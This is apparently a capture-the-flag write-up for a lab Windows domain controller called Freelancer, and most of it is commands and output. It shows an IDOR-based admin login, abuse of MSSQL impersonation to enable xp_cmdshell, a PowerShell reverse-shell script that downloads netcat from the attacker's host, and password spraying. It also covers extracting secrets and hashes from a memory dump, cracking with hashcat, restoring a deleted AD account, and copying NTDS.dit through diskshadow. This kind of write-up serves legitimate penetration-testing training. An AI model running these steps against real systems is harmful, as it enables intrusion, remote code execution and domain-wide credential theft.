## Freelancer

### Lab Details 

- Difficulty: Hard
- Type: IDOR, SQL, Memory Forensics, AV Evasion, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
$ nmap 10.129.207.134 -p- -T4 --min-rate 1000 -sC -A
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-11 21:17 CDT
Nmap scan report for 10.129.207.134
Host is up (0.0021s latency).
Not shown: 65498 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          nginx 1.25.5
|_http-server-header: nginx/1.25.5
|_http-title: Did not follow redirect to http://freelancer.htb/
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-12 07:17:37Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
2915/tcp  filtered tksocket
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
4930/tcp  filtered unknown
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        .NET Message Framing
11024/tcp filtered unknown
22944/tcp filtered unknown
30465/tcp filtered unknown
31033/tcp filtered unknown
36507/tcp filtered unknown
45842/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
49680/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open     msrpc         Microsoft Windows RPC
49682/tcp open     msrpc         Microsoft Windows RPC
49687/tcp open     msrpc         Microsoft Windows RPC
49711/tcp open     unknown
55297/tcp open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.207.134\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 55297
|     Named pipe: \\10.129.207.134\pipe\MSSQL$SQLEXPRESS\sql\query
|_    Clustered: false
| ms-sql-ntlm-info: 
|   10.129.207.134\SQLEXPRESS: 
|     Target_Name: FREELANCER
|     NetBIOS_Domain_Name: FREELANCER
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: freelancer.htb
|     DNS_Computer_Name: DC.freelancer.htb
|     DNS_Tree_Name: freelancer.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-12T07:13:43
|_Not valid after:  2055-10-12T07:13:43
|_ssl-date: 2025-10-12T07:18:44+00:00; +5h00m00s from scanner time.
61093/tcp filtered unknown
64094/tcp filtered unknown
64327/tcp filtered unknown
```
- enumerate port 80 with `ffuf`
```bash
$ ffuf -u http://freelancer.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://freelancer.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1319ms]
contact                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1379ms]
<SNIP>
```
- we get admin page however we are forbade to access it
- visit port 80 we are presented with web app called `Freelancer`
- enumerate through the app manually we see a login and register page
- register page allows `Freelancer register` as well as `Employer register`
- however when we attempt to login as `Employeer` we are presented with `Sorry, this account is not activated and can not be authenticated`
#### Initial Foothold
- by uploading a profile picture and view the picture source we can see that the file is named `10011.png` 
![[sequential user id.png]]
- and if we go to other users profile page we can see the user id been appended to the end of the image URL by hovering over the profile image
![[other user ids.png]]
- when we go to the `QR-Code` page we are presented with a test stating that scanning the `QR Code` we can login to the app without any credentials  
- scanning `QR Code` we get URL, use tool like `Authenticator Plugin for Firefox`
![[URL from QR.png]]
- URL of current user
```URL
http://freelancer.htb/accounts/login/otp/MTAwMTE=/f815b72eef944a59c5f5a3aa235ebd0f/
```
- decoding `MTAwMTE=` from base64 we get `10011` 
![[from base64 decode id.png]]
- can we generate a list of numbers from 1 to 10,000 as user id then scan through each using `ffuf`
```bash
$ ffuf -u 'http://freelancer.htb/accounts/profile/visit/FUZZ/' -X GET -H 'Cookie: sessionid=b424mse7s0ishwg5i7gxjamzpkubizgh; csrftoken=VQxGs7Y0xI8ibWcXEg4y7z6y3uQl2dFf' -w ~/numbers.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://freelancer.htb/accounts/profile/visit/FUZZ/
 :: Wordlist         : FUZZ: /home/ch4os1/numbers.txt
 :: Header           : Cookie: sessionid=b424mse7s0ishwg5i7gxjamzpkubizgh; csrftoken=VQxGs7Y0xI8ibWcXEg4y7z6y3uQl2dFf
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

5                       [Status: 200, Size: 16160, Words: 5936, Lines: 423, Duration: 264ms]
6                       [Status: 200, Size: 16148, Words: 5936, Lines: 423, Duration: 418ms]
12                      [Status: 200, Size: 16162, Words: 5942, Lines: 424, Duration: 438ms]
7                       [Status: 200, Size: 16173, Words: 5939, Lines: 424, Duration: 480ms]
8                       [Status: 200, Size: 16164, Words: 5937, Lines: 424, Duration: 504ms]
2                       [Status: 200, Size: 16156, Words: 5938, Lines: 423, Duration: 578ms]
4                       [Status: 200, Size: 16166, Words: 5939, Lines: 423, Duration: 582ms]
3                       [Status: 200, Size: 16663, Words: 6123, Lines: 431, Duration: 590ms]
10                      [Status: 200, Size: 16659, Words: 6139, Lines: 432, Duration: 619ms]
9                       [Status: 200, Size: 16144, Words: 5938, Lines: 424, Duration: 634ms]
```
- id 2 is for admin, we can craft an admin login URL by base64 encoding decimal 2 
```bash
## convert decimal 2 to base64 
Mg==

## insert to URL
http://freelancer.htb/accounts/login/otp/Mg==/3a11856eb1deed5a3fefe0dd9e3902a5/
```
- we can visit `/admin` endpoint from the scanning output in enumeration stage
- there is a `SQL Terminal` option at the bottom
![[sql terminal.png]]
- check databases
![[get dbs.png]]
- in `Freelancer_webapp_DB` database contains below tables
```
TABLE_NAME
auth_group
auth_group_permissions
auth_permission
django_admin_log
django_content_type
django_migrations
django_session
freelancer_article
freelancer_comment
freelancer_customuser
freelancer_employer
freelancer_freelancer
freelancer_job
freelancer_job_request
freelancer_otptoken
```
- table `freelancer_customuser` contains user hashes for the web app however we can attempt with checking database permissions to enable `xp_cmdshell`
- to do that first we will need to get current user principal id
```sql
-- get current user and SA principal id
SELECT name, principal_id FROM sys.server_principals WHERE name = 'sa' OR name =
'Freelancer_webapp_user'
-----------------------------------------
| name | principal_id |
| ---------------------- | ------------ |
| sa | 1 |
| Freelancer_webapp_user | 267 |
-----------------------------------------
```
- then check if we have `impersonate` privilege
```sql
-- check if we have impersonate pervilege
SELECT grantee_principal_id, permission_name, grantor_principal_id
FROM sys.server_permissions
WHERE grantee_principal_id = '267';
-----------------------------------------------------------
|grantee_principal_id|permission_name|grantor_principal_id|
|--------------------|---------------|--------------------|
|267 |CONNECT SQL |1 |
|267 |IMPERSONATE |1 |
-----------------------------------------------------------

-- check whos the grantor
SELECT a.name AS grantee, b.permission_name, c.name AS grantor
FROM sys.server_permissions b
INNER JOIN sys.server_principals a
ON b.grantee_principal_id = a.principal_id
INNER JOIN sys.server_principals c
ON b.grantor_principal_id = c.principal_id
WHERE b.permission_name = 'IMPERSONATE';

------------------------------------------------------
| grantee | permission_name | grantor |
| ---------------------- | --------------- | ------- |
| Freelancer_webapp_user | IMPERSONATE | sa |
------------------------------------------------------
```
- since we do have `impersonate` privilege as `SA`
- we can execute command with `SA` permission
- we can attempt to get a reverse shell
- first generate a `powershell` script that will fetch `nc` from local and execute a reverse shell
```bash
$ cat reverse.ps1
iwr http://10.10.14.82:8000/nc64.exe -outfile c:\\users\\public\\nc64.exe; c:\\users\\public\\nc64.exe -e powershell.exe 10.10.14.82 9000
```
- then enable `xp_cmdshell`
```sql
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
- fetch and execute the `powershell` script
```sql
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell "powershell -ep bypass iex(iwr http://10.10.14.82:8000/reverse.ps1 -usebasicp)";
```
- we get reverse shell as `sql_svc`
```bash
$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.207.134] 62921
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32> whoami
whoami
freelancer\sql_svc
```
#### Lateral Movement (If any)
- check for config files for passwords 
```bash
PS C:\Users\sql_svc> gci -path . -recurse -ea SilentlyContinue -Include *.txt,*.ini,*.yml,*.xml,*.ps1,*.cfg | select-string pass
gci -path . -recurse -ea SilentlyContinue -Include *.txt,*.ini,*.yml,*.xml,*.ps1,*.cfg | select-string pass

Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI:19:SQLSVCPASSWORD="IL0v3ErenY3ager"

$ nxc smb 10.129.207.134 -u users -p "IL0v3ErenY3ager"
SMB         10.129.207.134  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.129.207.134  445    DC               [-] freelancer.htb\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.129.207.134  445    DC               [-] freelancer.htb\Guest:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.129.207.134  445    DC               [-] freelancer.htb\krbtgt:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.129.207.134  445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
```
- we can perform a password spay against domain users
- get the AD users, save to a file 
```bash
PS C:\users\sql_svc> get-aduser -filter * | select samaccountname
samaccountname
--------------
Administrator
Guest
krbtgt
mikasaAckerman
sshd
SQLBackupOperator
sql_svc
lorra199
maya.artmes
michael.williams
sdavis
d.jones
jen.brown
taylor
jmartinez
olivia.garcia
dthomas
sophia.h
Ethan.l
wwalker
jgreen
evelyn.adams
hking
```
- password spray
```bash
$ nxc smb 10.129.134.78 -u users.txt -p IL0v3ErenY3ager
SMB         10.129.134.78   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.129.134.78   445    DC               [-] freelancer.htb\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.129.134.78   445    DC               [-] freelancer.htb\Guest:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.129.134.78   445    DC               [-] freelancer.htb\krbtgt:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.129.134.78   445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
```
- found password `IL0v3ErenY3ager` for user `mikasaAckerman`
```powershell
iwr 10.10.14.82:8000/RunasCs.exe -outfile runascs.exe


.\runascs.exe mikasaAckerman IL0v3ErenY3ager cmd -r 10.10.14.82:9001 -d freelancer.htb
```
- get reverse shell as `mikasaAckerman`
```powershell
PS C:\Users\mikasaAckerman\Desktop> ls
ls


    Directory: C:\Users\mikasaAckerman\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/28/2023   6:23 PM           1468 mail.txt                                                              
-a----        10/4/2023   1:47 PM      292692678 MEMORY.7z                                                             
-ar---       10/12/2025   3:13 AM             34 user.txt 
```
- check `Desktop` directory and found a zipped file and a text file
- from the text file we can see that the zipped file is a full memory dump of a computer
```powershell
PS C:\Users\mikasaAckerman\Desktop> cat mail.txt
cat mail.txt
Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
```
- transfer the zipped file using `impacket-smbserver`
```shell
## attacker side
$ sudo impacket-smbserver share . -smb2support -user user -password pass
## target side
net use z: \\10.10.14.82\share /user:user pass
copy MEMORY.7z z:\
```

```powershell
## unzip and investigate zipped dump file
 7z x MEMORY.7z
```
- to examine the memory dump we will require [MemProcFS](https://github.com/ufrisk/MemProcFS)
- a tool that allows us to view memory as virtual file system
- make a directory for the memory to reside and mount the memory using the tool

```bash
$ sudo mkdir /mnt/memprocfs
$ sudo ./memprocfs -device ../MEMORY.DMP -mount /mnt/memprocfs -forensic 0

Initialized 64-bit Windows 10.0.17763

==============================  MemProcFS  ==============================
 - Author:           Ulf Frisk - pcileech@frizk.net                      
 - Info:             https://github.com/ufrisk/MemProcFS                 
 - Discord:          https://discord.gg/pcileech                         
 - License:          GNU Affero General Public License v3.0              
 - Licensed To:      GNU Affero General Public License v3.0 - OPEN SOURCE USER.
   --------------------------------------------------------------------- 
   MemProcFS is free open source software. If you find it useful please  
   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)  
   --------------------------------------------------------------------- 
 - Version:          5.16.1 (Linux)
 - Mount Point:      /mnt/memprocfs           
 - Tag:              17763_a3431de6        
 - Operating System: Windows 10.0.17763 (X64)
==========================================================================
```
- to fully use this tool we will need plugin named `regsecrets`
- clone it 
```bash
git clone https://github.com/ufrisk/MemProcFS-plugins.git
```
- visit `/MemProcFS-plugins/files/plugins` directory and move `pym_regsecrets` to the home directory of `MemProcFS`
- restart `MemProcFS` and check `py/regsecrets` in the mount directory
- check `all.txt`
```bash
#cat all.txt
============== SAM hive secrets ==============
HBoot Key: ea5f053efa118386e50003fe8d99078310101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
============== SECURITY hive secrets ==============
Iteration count: 10240
Secrets structure format : VISTA
LSA Key: c6a7057cad4f93923c45b26cbaaa5550ce747620c8ef8772e53dccb70f55889e
NK$LM Key: 40000000000000000000000000000000634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320fe8905909f598175c930e9b170818d39
FREELANCER.HTB/Administrator:*2023-10-04 12:55:34*$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361
FREELANCER.HTB/lorra199:*2023-10-04 12:29:00*$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1
FREELANCER.HTB/liza.kazanof:*2023-10-04 17:31:23*$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679
=== LSA Machine account password ===
History: False
NT: 1003ddfa0a470017188b719e1eaae709
Password(hex): a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a62ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010
Kerberos password(hex): e882a6eabea4ee80b0d985e1a5a4ef9786dcace78cbde48682e9b7baefbc9ce1ad99e19695ecbcb5e38bb5e1808be6969ee0b0a2e9b89ceaa18feca691eebb91eea4a2ec9290e6adb6eb98beeb8cbfefbfbdeeada7e9a391ed90b0e0ad9cee9aa4efbfbde1a293e0a88ce4a5b4d9b5eeb595e8bb97e4a2b8e59fb7e9a9a8e8a5a8efa3b3ef9bb7e58f8fe1a7a1e589aae7b28ad791eeb2a2efaf8ee19caae5aaaeefa3abc989e29ba3ebb1abeb999de787a3e7ada2e88ab0e2aa8ce4b0b6e186b0ecbc99e2b0bdefbfbde388a0e8868ceab58cef8887e19ab5e3b494ed8286e8bba8e583b1e69d80e5ba81e0bb97ecae9ce1be86e3a597e9918de9bebae1a5b7e9b68eeeb1b6efa2adeb878defbfbdeba188e8849fe4ab98e29786e3a0b0eb9a9ce4858de7a0abe0bd8fe395b3ea9991ec80aee2aa86efaf82e1aca6ed9d83e98299ee8b94ebbebfe7b58deead8eecb290efbfbde4a29be2a0a0e19382e5a8bce181a0
=== LSA Machine account password ===
History: True
NT: 4e7857719aec1e3f13e79f28f68bb95d
Password(hex): 3300740032004300770065003b0038004b00780021003a0062002c0072003d0034002300280024007a002a006a006900450049005000220031003000600063002d0049002500680060004000280029002300560077004f0027006e005d0042006c007300510043003a00230055005100410048004b006e003b0024003900430030004000200047007400420049003300430048005f0036006200740024003b002000750052002500530067006500420066004d004d00600076005a0030004000740038005b003300460067004400620058006f0051005e004c0036005a00370072004200780038003900200078003a00
Kerberos password(hex): 3374324377653b384b78213a622c723d342328247a2a6a6945495022313060632d492568604028292356774f276e5d426c7351433a23555141484b6e3b243943304020477442493343485f366274243b2075522553676542664d4d60765a304074385b3346674462586f515e4c365a37724278383920783a
=== LSA DPAPI secret ===
History: False
Machine key (hex): cf1bc407d272ade7e781f17f6f3a3fc2b82d16bc
User key(hex): 6d210ab98889fac8829a1526a5d6a2f76f8f9d53
=== LSA DPAPI secret ===
History: True
Machine key (hex): ee8c9b3c041dc01afb54b421d4fafa0bbd314c1c
User key(hex): a3a744a52e541603869eef3ee06191dd8597db83
=== LSASecret NL$KM ===

History: False
Secret: 
00000000:  63 4d 9d 4c 85 ef 33 ff  a5 e1 4d e2 dc a1 20 75   |cM.L..3...M... u|
00000010:  d2 20 ea a9 bc e0 db 7d  be 77 e9 be 6e ad 47 ec   |. .....}.w..n.G.|
00000020:  26 02 e1 f6 bf f5 c5 cc  f9 d6 7a 16 49 1c 43 c5   |&.........z.I.C.|
00000030:  77 6d e0 a8 c6 24 15 36  bf 27 49 96 19 b9 63 20   |wm...$.6.'I...c |
=== LSASecret NL$KM ===

History: True
Secret: 
00000000:  63 4d 9d 4c 85 ef 33 ff  a5 e1 4d e2 dc a1 20 75   |cM.L..3...M... u|
00000010:  d2 20 ea a9 bc e0 db 7d  be 77 e9 be 6e ad 47 ec   |. .....}.w..n.G.|
00000020:  26 02 e1 f6 bf f5 c5 cc  f9 d6 7a 16 49 1c 43 c5   |&.........z.I.C.|
00000030:  77 6d e0 a8 c6 24 15 36  bf 27 49 96 19 b9 63 20   |wm...$.6.'I...c |
=== LSA Service User Secret ===
History: False
Service name: _SC_MSSQL$DATA 
Username: UNKNOWN
00000000:  50 57 4e 33 44 23 6c 30  72 72 40 41 72 6d 65 73   |PWN3D#l0rr@Armes|
00000010:  73 61 31 39 39                                     
|sa199|
=== LSA Service User Secret ===
History: True
Service name: _SC_MSSQL$DATA 
Username: UNKNOWN
00000000:  4d 53 53 51 4c 53 33 72  76 33 72 50 40 73 73 77   |MSSQLS3rv3rP@ssw|
00000010:  64 23 30 39                                        
|d#09|
============== SOFTWARE hive secrets ==============
default_logon_user: 
default_logon_domain: TEST
default_logon_password: None
```
- there are three hashes
```
$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361
$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1
$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679
```
- and two plaint test passwords 
```
MSSQLS3rv3rP@sswd#09
PWN3D#l0rr@Armessa199
```
- add the plaintext passwords to rockyou.txt and decrypt against the hashes 
```bash
 $ echo "PWN3D#l0rr@Armessa199" >> ./rockyou_plus.txt
 $ echo 'MSSQLS3rv3rP@sswd#09' >> ./rockyou_plus.txt 
 $ hashcat -a 0 -m 2100 hashes.txt rockyou_plus.txt
```
- we get passwords for `lorra199` and `liza.kazanof`
```bash
$ cat ~/.local/share/hashcat/hashcat.potfile 
$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679:RockYou!
$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1:PWN3D#l0rr@Armessa199
```
- attempt with credential spraying and we get login for user `lorra199`
```bash
$ nxc winrm 10.129.139.163 -u users -p pass --continue-on-success
WINRM       10.129.139.163  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb)
WINRM       10.129.139.163  5985   DC               [-] freelancer.htb\liza.kazanof:RockYou!
WINRM       10.129.139.163  5985   DC               [-] freelancer.htb\lorra199:RockYou!
WINRM       10.129.139.163  5985   DC               [-] freelancer.htb\liza.kazanof:PWN3D#l0rr@Armessa199
WINRM       10.129.139.163  5985   DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 (Pwn3d!) 
```
- and we have `winrm` access to target
```powershell
*Evil-WinRM* PS C:\Users\lorra199\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
FREELANCER\AD Recycle Bin                  Group            S-1-5-21-3542429192-2036945976-3483670807-1164 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```
- `lorra199` has `AD Recycle Bin` group privilege we can attempt to restore deleted objects with that privilege
- first check for deleted objects
```powershell
*Evil-WinRM* PS C:\Users\lorra199\Documents> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects



Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=freelancer,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : bb081f2b-bd0a-4fc7-b3e9-50e107e961ee

Deleted           : True
DistinguishedName : CN=liza.dattacker\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=freelancer,DC=htb
Name              : liza.dattacker
                    DEL:ebe15df5-e265-45ec-b7fc-359877217138
ObjectClass       : user
ObjectGUID        : ebe15df5-e265-45ec-b7fc-359877217138

```
- we see `liza.kazanof` is in the response 
- we can attempt to restore it 
```powershell
restore-ADObject -identity 'ebe15df5-e265-45ec-b7fc-359877217138' -newname "liza.dattacker"
```
- once we have restored it we can attempt to check user status using `nxc`
```bash
$ nxc smb freelancer.htb -u liza.kazanof -p passwords.list -d freelancer.htb
SMB 10.129.134.78 445 DC [-]
freelancer.htb\liza.kazanof:RockYou! STATUS_PASSWORD_EXPIRED
```
- we get password expired error 
- update the password using `impacket-smbpasswd`
```bash
$ impacket-smbpasswd freelancer.htb/liza.kazanof:'RockYou!'@freelancer.htb -newpass 'password123!'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

===============================================================================
  Warning: This functionality will be deprecated in the next Impacket version  
===============================================================================

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```
- we can get reverse shell via `evil-winrm` as `liza.kazanof`
```bash
$ evil-winrm -i freelancer.htb -u liza.kazanof -p 'password123!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
```
#### Privilege Escalation
- check `groups`
```bash
*Evil-WinRM* PS C:\Users\liza.kazanof\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
- user is in `Backup Operators `
- membership in the Backup Operators group provides access to the file system due to the `SeBackup` and `SeRestore` privileges
- we can use this privilege to create a snapshot of the file system
- create script for `diskshadow`
```powershell
SET VERBOSE ON
set context persistent nowriters
set metadata C:\windows\temp\meta.cab
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
- run the script to get the copy of the file system
```powershell
*Evil-WinRM* PS C:\Users\liza.kazanof\Documents> diskshadow /s shadow.script
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/13/2025 11:45:15 AM

-> SET VERBOSE on
-> set context persistent nowriters
-> set metadata C:\windows\temp\meta.cab
-> begin backup
-> add volume C: alias cdrive
-> create

Alias cdrive for shadow ID {44b4e636-8ceb-45d3-8fa0-2d1bc9ab0e9a} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {b5b633a5-8da8-4050-acae-d92eb7e080fc} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file Dis9B81.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {b5b633a5-8da8-4050-acae-d92eb7e080fc}

	* Shadow copy ID = {44b4e636-8ceb-45d3-8fa0-2d1bc9ab0e9a}		%cdrive%
		- Shadow copy set: {b5b633a5-8da8-4050-acae-d92eb7e080fc}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{011d3cdb-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 10/13/2025 11:45:17 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: DC.freelancer.htb
		- Service machine: DC.freelancer.htb
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %cdrive% F:
-> %cdrive% = {44b4e636-8ceb-45d3-8fa0-2d1bc9ab0e9a}
The shadow copy was successfully exposed as F:\.
-> end backup
-> exit
```
- copy `NTDS` to directory that we control
```powershell
robocopy /B F:\Windows\NTDS .ntds.dit

*Evil-WinRM* PS C:\Users\liza.kazanof\Documents> reg save hklm\system system; reg save hklm\sam sam

